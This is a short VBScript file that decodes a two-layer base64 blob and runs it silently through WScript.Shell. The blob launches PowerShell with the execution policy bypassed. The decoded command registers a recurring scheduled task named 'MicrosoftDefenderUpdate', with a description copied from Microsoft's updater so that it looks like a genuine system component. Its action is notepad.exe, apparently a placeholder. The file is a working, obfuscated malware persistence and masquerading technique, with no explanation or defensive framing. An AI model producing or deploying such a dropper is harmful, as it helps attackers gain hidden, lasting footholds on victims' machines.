Dim encodedCommand
encodedCommand = "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAAUgB3AEIAbABBAEgAUQBBAEwAUQBCAFQAQQBHAE0AQQBhAEEAQgBsAEEARwBRAEEAZABRAEIAcwBBAEcAVQBBAFoAQQBCAFUAQQBHAEUAQQBjAHcAQgByAEEAQwBBAEEAZgBBAEEAZwBBAEYAYwBBAGEAQQBCAGwAQQBIAEkAQQBaAFEAQQB0AEEARQA4AEEAWQBnAEIAcQBBAEcAVQBBAFkAdwBCADAAQQBDAEEAQQBWAEEAQgBoAEEASABNAEEAYQB3AEIATwBBAEcARQBBAGIAUQBCAGwAQQBDAEEAQQBMAFEAQgBzAEEARwBrAEEAYQB3AEIAbABBAEMAQQBBAEkAZwBCAE4AQQBHAGsAQQBZAHcAQgB5AEEARwA4AEEAYwB3AEIAdgBBAEcAWQBBAGQAQQBCAEUAQQBHAFUAQQBaAGcAQgBsAEEARwA0AEEAWgBBAEIAbABBAEgASQBBAFYAUQBCAHcAQQBHAFEAQQBZAFEAQgAwAEEARwBVAEEASQBnAEEAZwBBAEgAdwBBAEkAQQBCAEcAQQBHADgAQQBjAGcAQgBGAEEARwBFAEEAWQB3AEIAbwBBAEMAMABBAFQAdwBCAGkAQQBHAG8AQQBaAFEAQgBqAEEASABRAEEASQBBAEIANwBBAEMAQQBBAFYAUQBCAHUAQQBIAEkAQQBaAFEAQgBuAEEARwBrAEEAYwB3AEIAMABBAEcAVQBBAGMAZwBBAHQAQQBGAE0AQQBZAHcAQgBvAEEARwBVAEEAWgBBAEIAMQBBAEcAdwBBAFoAUQBCAGsAQQBGAFEAQQBZAFEAQgB6AEEARwBzAEEASQBBAEEAdABBAEYAUQBBAFkAUQBCAHoAQQBHAHMAQQBUAGcAQgBoAEEARwAwAEEAWgBRAEEAZwBBAEMAUQBBAFgAdwBBAHUAQQBGAFEAQQBZAFEAQgB6AEEARwBzAEEAVABnAEIAaABBAEcAMABBAFoAUQBBAGcAQQBDADAAQQBRAHcAQgB2AEEARwA0AEEAWgBnAEIAcABBAEgASQBBAGIAUQBBADYAQQBDAFEAQQBaAGcAQgBoAEEARwB3AEEAYwB3AEIAbABBAEMAQQBBAGYAUQBBADcAQQBDAEEAQQBVAGcAQgBsAEEARwBjAEEAYQBRAEIAegBBAEgAUQBBAFoAUQBCAHkAQQBDADAAQQBVAHcAQgBqAEEARwBnAEEAWgBRAEIAawBBAEgAVQBBAGIAQQBCAGwAQQBHAFEAQQBWAEEAQgBoAEEASABNAEEAYQB3AEEAZwBBAEMAMABBAFYAQQBCAGgAQQBIAE0AQQBhAHcAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAEkAZwBCAE4AQQBHAGsAQQBZAHcAQgB5AEEARwA4AEEAYwB3AEIAdgBBAEcAWQBBAGQAQQBCAEUAQQBHAFUAQQBaAGcAQgBsAEEARwA0AEEAWgBBAEIAbABBAEgASQBBAFYAUQBCAHcAQQBHAFEAQQBZAFEAQgAwAEEARwBVAEEASQBnAEEAZwBBAEMAMABBAFYAQQBCAHkAQQBHAGsAQQBaAHcAQgBuAEEARwBVAEEAYwBnAEEAZwBBAEMAZwBBAFQAZwBCAGwAQQBIAGMAQQBMAFEAQgBUAEEARwBNAEEAYQBBAEIAbABBAEcAUQBBAGQAUQBCAHMAQQBHAFUAQQBaAEEAQgBVAEEARwBFAEEAYwB3AEIAcgBBAEYAUQBBAGMAZwBCAHAAQQBHAGMAQQBaAHcAQgBsAEEASABJAEEASQBBAEEAdABBAEUAOABBAGIAZwBCAGoAQQBHAFUAQQBJAEEAQQB0AEEARQBFAEEAZABBAEEAZwBBAEMAZwBBAFIAdwBCAGwAQQBIAFEAQQBMAFEAQgBFAEEARwBFAEEAZABBAEIAbABBAEMAawBBAEwAZwBCAEIAQQBHAFEAQQBaAEEAQgBOAEEARwBrAEEAYgBnAEIAMQBBAEgAUQBBAFoAUQBCAHoAQQBDAGcAQQBNAFEAQQBwAEEAQwBBAEEATABRAEIAUwBBAEcAVQBBAGMAQQBCAGwAQQBIAFEAQQBhAFEAQgAwAEEARwBrAEEAYgB3AEIAdQBBAEUAawBBAGIAZwBCADAAQQBHAFUAQQBjAGcAQgAyAEEARwBFAEEAYgBBAEEAZwBBAEMAZwBBAFQAZwBCAGwAQQBIAGMAQQBMAFEAQgBVAEEARwBrAEEAYgBRAEIAbABBAEYATQBBAGMAQQBCAGgAQQBHADQAQQBJAEEAQQB0AEEARQAwAEEAYQBRAEIAdQBBAEgAVQBBAGQAQQBCAGwAQQBIAE0AQQBJAEEAQQB4AEEARABBAEEASwBRAEEAcABBAEMAQQBBAEwAUQBCAEIAQQBHAE0AQQBkAEEAQgBwAEEARwA4AEEAYgBnAEEAZwBBAEMAZwBBAFQAZwBCAGwAQQBIAGMAQQBMAFEAQgBUAEEARwBNAEEAYQBBAEIAbABBAEcAUQBBAGQAUQBCAHMAQQBHAFUAQQBaAEEAQgBVAEEARwBFAEEAYwB3AEIAcgBBAEUARQBBAFkAdwBCADAAQQBHAGsAQQBiAHcAQgB1AEEAQwBBAEEATABRAEIARgBBAEgAZwBBAFoAUQBCAGoAQQBIAFUAQQBkAEEAQgBsAEEAQwBBAEEASQBnAEIAdQBBAEcAOABBAGQAQQBCAGwAQQBIAEEAQQBZAFEAQgBrAEEAQwA0AEEAWgBRAEIANABBAEcAVQBBAEkAZwBBAHAAQQBDAEEAQQBMAFEAQgBUAEEARwBVAEEAZABBAEIAMABBAEcAawBBAGIAZwBCAG4AQQBIAE0AQQBJAEEAQQBvAEEARQA0AEEAWgBRAEIAMwBBAEMAMABBAFUAdwBCAGoAQQBHAGcAQQBaAFEAQgBrAEEASABVAEEAYgBBAEIAbABBAEcAUQBBAFYAQQBCAGgAQQBIAE0AQQBhAHcAQgBUAEEARwBVAEEAZABBAEIAMABBAEcAawBBAGIAZwBCAG4AQQBIAE0AQQBVAHcAQgBsAEEASABRAEEASQBBAEEAdABBAEUARQBBAGIAQQBCAHMAQQBHADgAQQBkAHcAQgBUAEEASABRAEEAWQBRAEIAeQBBAEgAUQBBAFMAUQBCAG0AQQBFADgAQQBiAGcAQgBDAEEARwBFAEEAZABBAEIAMABBAEcAVQBBAGMAZwBCAHAAQQBHAFUAQQBjAHcAQQBnAEEAQwAwAEEAUgBBAEIAdgBBAEcANABBAGQAQQBCAFQAQQBIAFEAQQBiAHcAQgB3AEEARQBrAEEAWgBnAEIASABBAEcAOABBAGEAUQBCAHUAQQBHAGMAQQBUAHcAQgB1AEEARQBJAEEAWQBRAEIAMABBAEgAUQBBAFoAUQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBBAEEATABRAEIAVABBAEgAUQBBAFkAUQBCAHkAQQBIAFEAQQBWAHcAQgBvAEEARwBVAEEAYgBnAEIAQgBBAEgAWQBBAFkAUQBCAHAAQQBHAHcAQQBZAFEAQgBpAEEARwB3AEEAWgBRAEEAcABBAEMAQQBBAEwAUQBCAEUAQQBHAFUAQQBjAHcAQgBqAEEASABJAEEAYQBRAEIAdwBBAEgAUQBBAGEAUQBCAHYAQQBHADQAQQBJAEEAQQBpAEEARQBzAEEAWgBRAEIAbABBAEgAQQBBAGMAdwBBAGcAQQBIAGsAQQBiAHcAQgAxAEEASABJAEEASQBBAEIATgBBAEcAawBBAFkAdwBCAHkAQQBHADgAQQBjAHcAQgB2AEEARwBZAEEAZABBAEEAZwBBAEgATQBBAGIAdwBCAG0AQQBIAFEAQQBkAHcAQgBoAEEASABJAEEAWgBRAEEAZwBBAEgAVQBBAGMAQQBBAGcAQQBIAFEAQQBiAHcAQQBnAEEARwBRAEEAWQBRAEIAMABBAEcAVQBBAEwAZwBBAGcAQQBFAGsAQQBaAGcAQQBnAEEASABRAEEAYQBBAEIAcABBAEgATQBBAEkAQQBCADAAQQBHAEUAQQBjAHcAQgByAEEAQwBBAEEAYQBRAEIAegBBAEMAQQBBAFoAQQBCAHAAQQBIAE0AQQBZAFEAQgBpAEEARwB3AEEAWgBRAEIAawBBAEMAQQBBAGIAdwBCAHkAQQBDAEEAQQBjAHcAQgAwAEEARwA4AEEAYwBBAEIAdwBBAEcAVQBBAFoAQQBBAHMAQQBDAEEAQQBlAFEAQgB2AEEASABVAEEAYwBnAEEAZwBBAEUAMABBAGEAUQBCAGoAQQBIAEkAQQBiAHcAQgB6AEEARwA4AEEAWgBnAEIAMABBAEMAQQBBAGMAdwBCAHYAQQBHAFkAQQBkAEEAQgAzAEEARwBFAEEAYwBnAEIAbABBAEMAQQBBAGQAdwBCAHAAQQBHAHcAQQBiAEEAQQBnAEEARwA0AEEAYgB3AEIAMABBAEMAQQBBAFkAZwBCAGwAQQBDAEEAQQBhAHcAQgBsAEEASABBAEEAZABBAEEAZwBBAEgAVQBBAGMAQQBBAGcAQQBIAFEAQQBiAHcAQQBnAEEARwBRAEEAWQBRAEIAMABBAEcAVQBBAEwAQQBBAGcAQQBHADAAQQBaAFEAQgBoAEEARwA0AEEAYQBRAEIAdQBBAEcAYwBBAEkAQQBCAHoAQQBHAFUAQQBZAHcAQgAxAEEASABJAEEAYQBRAEIAMABBAEgAawBBAEkAQQBCADIAQQBIAFUAQQBiAEEAQgB1AEEARwBVAEEAYwBnAEIAaABBAEcASQBBAGEAUQBCAHMAQQBHAGsAQQBkAEEAQgBwAEEARwBVAEEAYwB3AEEAZwBBAEgAUQBBAGEAQQBCAGgAQQBIAFEAQQBJAEEAQgB0AEEARwBFAEEAZQBRAEEAZwBBAEcARQBBAGMAZwBCAHAAQQBIAE0AQQBaAFEAQQBnAEEARwBNAEEAWQBRAEIAdQBBAEcANABBAGIAdwBCADAAQQBDAEEAQQBZAGcAQgBsAEEAQwBBAEEAWgBnAEIAcABBAEgAZwBBAFoAUQBCAGsAQQBDAEEAQQBZAFEAQgB1AEEARwBRAEEASQBBAEIAbQBBAEcAVQBBAFkAUQBCADAAQQBIAFUAQQBjAGcAQgBsAEEASABNAEEASQBBAEIAdABBAEcARQBBAGUAUQBBAGcAQQBHADQAQQBiAHcAQgAwAEEAQwBBAEEAZAB3AEIAdgBBAEgASQBBAGEAdwBBAGkAQQBBAD0APQA="

Function DecodeBase64(base64String)
    Dim xmlDoc, node, stream
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "Unicode"
    DecodeBase64 = stream.ReadText
    stream.Close
End Function

Dim decodedCommand
decodedCommand = DecodeBase64(encodedCommand)

Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run decodedCommand, 0, True